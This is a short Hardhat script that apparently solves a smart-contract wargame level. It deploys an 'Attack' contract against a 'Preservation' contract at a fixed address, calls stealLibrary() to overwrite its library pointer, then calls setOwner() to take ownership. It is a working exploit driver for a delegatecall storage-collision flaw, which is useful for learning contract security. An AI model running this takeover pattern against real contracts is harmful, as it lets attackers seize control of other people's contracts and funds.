import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const Preserve = await helper.getContractAt("Preservation", "0x031f9a7C353F6A83B0f9e7f0805fAA6fE3A2D25d");
    const Attack = await helper.deployContract("Attack", Preserve.address);

    console.log(`Account: ${account.address}`);
    console.log(`Attacker: ${Attack.address}`);
    let tx = await Attack.stealLibrary();
    await tx.wait();

    console.log(await Preserve.timeZone1Library());

    tx = await Attack.setOwner({
        gasLimit: 1000000
    });
    await tx.wait();

    console.log(await Preserve.owner());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });